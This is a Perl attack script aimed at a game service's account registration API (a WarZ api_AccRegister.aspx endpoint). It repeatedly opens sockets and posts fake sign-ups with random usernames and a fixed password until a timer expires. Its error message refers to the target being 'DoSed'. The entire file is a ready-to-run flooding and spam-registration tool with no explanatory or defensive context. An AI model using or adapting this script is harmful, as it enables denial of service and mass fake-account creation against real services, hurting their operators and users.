#!/usr/bin/perl
use IO::Socket;

if ($#ARGV != 3) {
  print "-Tip on use : perl api.pl 1.1.1.1 80 /WarZ/api/api_AccRegister.aspx 20\n";
  exit(1);
}

my ($host,$pth,$api,$time) = @ARGV;
my ($endtime);
$endtime = time() + ($time ? $time : 1000000);
for (;time() <= $endtime;) {
		 $mail = int(rand(999999));
		 $kapoom = int(rand(5));
		 $postit = "username=$mail$kapoom%40haseg.$mail&userid=$mail&password=Kakattacj123&serial=&email=not%40used.de";
		 $lrg = length $postit;
		 my $sock = new IO::Socket::INET (
									 PeerAddr => "$host",
									 PeerPort => "$pth",
									 Proto => "tcp",
									 );
		 die "\n0offline! - We can not Connet To $host it May be DoSed\n" unless $sock;
		 
		 print $sock "POST $api HTTP/1.1\n";
		 print $sock "Content-Type: application/x-www-form-urlencoded\n";
		 print $sock "Host: ",$host,"\n";
		 print $sock "Content-Length: ",$lrg,"\n\n";
		 print $sock $postit,"\n";
		 syswrite STDOUT, "Success! $postit\n";
	  }